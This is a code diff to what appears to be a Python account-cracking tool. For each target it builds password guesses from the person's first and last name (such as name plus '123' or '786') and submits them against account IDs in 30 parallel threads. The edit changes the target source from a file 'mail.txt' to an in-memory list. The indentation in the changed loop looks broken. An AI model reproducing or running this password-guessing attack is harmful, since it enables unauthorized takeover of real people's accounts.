@@ -416,7 +416,6 @@ class crack_main():
                         print(' Total account : \033[1;32m'+total)
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
-                        self.id = open('mail.txt').read().splitlines()
                         for user in zia:
                                 ids,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
@@ -428,7 +427,7 @@ class crack_main():
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 with ThreadPool(max_workers=30) as formSubmit:
-                        for user in self.id:
+                        for user in zia:
                                 iid,name = user.split('|')
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
